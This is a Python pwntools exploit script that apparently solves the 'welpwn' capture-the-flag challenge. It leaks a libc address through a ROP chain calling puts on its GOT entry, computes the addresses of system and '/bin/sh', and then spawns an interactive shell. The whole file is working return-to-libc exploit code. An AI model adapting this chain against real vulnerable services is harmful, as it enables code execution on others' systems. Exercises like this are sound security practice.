
from pwn import *
from leak_to_address import *

context.terminal = ['gnome-terminal', '-e']

r = process('./welpwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./welpwn')

puts_off = libc.sym['puts']

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

pop_rdi = 0x4008a3  # pop rdi; ret;
pop_r12 = 0x40089c  # pop r12; pop r13; pop r14; pop r15; ret;

r.readline()

p = 'A' * 24
p += p64(pop_r12)
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

r.sendline(p)

s = r.readline()

l = Leak_address('\x00' * 5 + s, 64)
# print(l.print_leak())

LIBC_BASE = (l.leak_to_64_int(4) & 0xffffffffffff) - puts_off
ADDR_BINSH = libc.search('/bin/sh').next() + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

log.info('LIBC_BASE    : ' + hex(LIBC_BASE))
log.info('ADDR_SYSTEM  : ' + hex(ADDR_SYSTEM))
log.info('ADDR_BINSH   : ' + hex(ADDR_BINSH))


p = 'A' * 24
p += p64(pop_r12)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)
p += p64(main)

r.sendline(p)

r.interactive()
